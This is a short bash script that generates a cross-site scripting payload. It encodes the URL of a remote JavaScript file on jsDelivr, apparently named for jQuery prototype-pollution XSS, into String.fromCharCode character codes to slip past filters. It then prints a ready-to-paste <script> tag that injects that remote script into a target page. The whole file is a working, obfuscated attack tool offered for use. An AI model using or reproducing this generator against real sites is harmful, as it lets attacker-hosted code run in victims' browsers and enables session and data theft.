#!/bin/bash

# Your GitHub URL via jsDelivr
URL="https://cdn.jsdelivr.net/gh/yossefsabry/_scripts@main/qjuery_pollution_xss.js"

# Convert URL to CharCodes
CODES=$(python3 <<EOF
import sys
url = "$URL"
print(','.join([str(ord(c)) for c in url]))
EOF
)

echo "--- COPY EVERYTHING BELOW THIS LINE ---"
echo "<script>(function(){var s=document.createElement('script');s.src=String.fromCharCode($CODES);document.head.appendChild(s);})()</script>"
echo "--- END OF PAYLOAD ---"
